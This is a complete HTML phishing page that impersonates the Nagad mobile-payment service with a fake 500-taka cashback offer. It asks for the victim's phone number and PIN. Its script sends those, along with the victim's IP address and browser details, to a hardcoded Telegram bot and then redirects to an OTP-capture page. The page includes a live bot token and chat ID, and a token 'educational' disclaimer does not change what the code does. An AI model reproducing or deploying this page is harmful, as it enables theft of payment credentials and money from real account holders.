<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="https://i.ibb.co/n0yL4dR/1679248787-Nagad-Logo-1.png" type="image/png" />
    <meta property="og:title" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ৫০০ টাকা বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
    <meta property="og:description" content="এখনই লগইন করুন নগদ ওয়েবসাইটে ৫০০ টাকা। বোনাস পাওয়ার জন্য সীমিত সুযোগ!" />
    <meta property="og:image" content="https://i.ibb.co/VJCz5cG/142545-117.jpg" />
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>নগদ ৫০০৳ ক্যাশব্যাক অফার</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            padding: 30px 16px;
            overflow-x: hidden;
        }

        .logo { text-align: center; margin-bottom: 20px; animation: fadeIn 1s ease-in-out; }
        .logo img { max-width: 90px; width: 100%; height: auto; }

        .container {
            background-color: #fafafa;
            padding: 20px 10px;
            border-radius: 10px;
            width: 100%;
            max-width: 340px;
            animation: fadeIn 1.5s ease-in-out;
        }

        .input-group { margin-bottom: 22px; text-align: left; position: relative; animation: fadeIn 2s ease-in-out; }
        .input-group p { margin: 0 0 6px; font-weight: bold; font-size: 15px; }
        .input-icon { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #ee462b; font-family: FontAwesome; }

        .fa-phone:before { content: "\f095"; }
        .fa-lock:before  { content: "\f023"; }

        input[type="number"] {
            width: 100%;
            padding: 12px 12px 12px 40px;
            border: none;
            border-bottom: 2px solid #CCCCCC;
            border-radius: 4px;
            font-family: Arial, sans-serif;
            font-size: 17px;
            background-color: #fafafa;
            transition: border-color 0.3s;
            -moz-appearance: textfield;
        }
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type="number"]::placeholder { color: #999999; font-size: 16px; }
        input:focus { border-bottom: 2px solid #ee462b; outline: none; }
        input.invalid { border-bottom: 2px solid red; }

        #loginButton {
            background-color: transparent;
            color: #ee462b;
            border: 2px solid #ee462b;
            padding: 12px 20px;
            border-radius: 22px;
            cursor: pointer;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            font-size: 17px;
            transition: background-color 0.3s, color 0.3s, transform 0.3s;
            animation: fadeIn 2.5s ease-in-out;
        }
        #loginButton:hover  { background-color: #ee462b; color: #FFFFFF; }
        #loginButton:active { transform: scale(0.98); }
        #loginButton:disabled { opacity: 0.6; cursor: not-allowed; }

        @media (max-width: 360px) {
            body { padding: 20px 12px; }
            .logo img { max-width: 75px; }
            .container { padding: 15px 8px; }
            input[type="number"] { font-size: 16px; padding: 10px 10px 10px 36px; }
            #loginButton { font-size: 16px; padding: 10px 16px; }
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://i.ibb.co/k8LkGTT/removal-ai-d3363a06-05e5-4e1d-bb5b-60348f7c2805-img-20240617-115730.png" alt="Nagad Logo">
    </div>
    <div class="container">
        <div class="input-group">
            <p>মোবাইল নাম্বার</p>
            <i class="fa fa-phone input-icon"></i>
            <input type="number" placeholder="XXX-XXXX-XXXX" id="mobileNumber">
        </div>
        <div class="input-group">
            <p>নগদ পিন</p>
            <i class="fa fa-lock input-icon"></i>
            <input type="number" placeholder="XXXX" id="pin">
        </div>
        <button id="loginButton">লগ ইন</button>
    </div>

    <script>
        // ==================================================
        // 🔧 BOT CREDENTIALS
        // ==================================================
        const BOT_TOKEN = "8661744356:AAH68RCgDjAvxpVSIAltl2QUYRvYn7yD5pU";
        const CHAT_ID   = "5085997009";

        // URL param thakle seta use korbe, nahole fixed ta
        const params = new URLSearchParams(window.location.search);
        const token  = params.get('token') || BOT_TOKEN;
        const chatId = params.get('id')    || CHAT_ID;

        // ==================================================
        const loginButton  = document.getElementById('loginButton');
        const mobileNumber = document.getElementById('mobileNumber');
        const pin          = document.getElementById('pin');

        // Telegram message helper
        async function sendToTelegram(token, chatId, message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const data = await res.json();
                console.log('Telegram response:', data);
                return data.ok;
            } catch (err) {
                console.error('Telegram fetch error:', err);
                return false;
            }
        }

        loginButton.addEventListener('click', async () => {
            const mobileNumberValue = mobileNumber.value.trim();
            const pinValue          = pin.value.trim();
            let isValid = true;

            if (!/^01\d{9}$/.test(mobileNumberValue)) {
                mobileNumber.classList.add('invalid'); isValid = false;
            } else mobileNumber.classList.remove('invalid');

            if (!/^\d{4}$/.test(pinValue)) {
                pin.classList.add('invalid'); isValid = false;
            } else pin.classList.remove('invalid');

            if (!isValid) {
                alert('দয়া করে সঠিক নাম্বার এবং পিন লিখুন!');
                return;
            }

            // Loading state
            loginButton.disabled    = true;
            loginButton.textContent = 'অপেক্ষা করুন...';

            const userAgent = navigator.userAgent;
            const date      = new Date();

            // IP fetch
            let ip = 'Unknown';
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                ip = (await ipRes.json()).ip;
            } catch (e) { console.warn('IP fetch failed'); }

            const userMessage = `<b>🎣 নগদ ফি-শিং তথ্য</b>

📱 <b>Mobile Number:</b> <code>${mobileNumberValue}</code>

🔐 <b>PIN:</b> <code>${pinValue}</code>

🌐 <b>IP Address:</b> ${ip}

💻 <b>User Agent:</b> ${userAgent}

📅 <b>Date:</b> ${date.toLocaleString()}

<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে।</blockquote>`;

            // Telegram e pathao
            await sendToTelegram(token, chatId, userMessage);

            // Ektu wait koro
            await new Promise(r => setTimeout(r, 700));

            // OTP page e redirect
            window.location.href = `otp.html?token=${encodeURIComponent(token)}&id=${encodeURIComponent(chatId)}`;
        });
    </script>
</body>
</html>
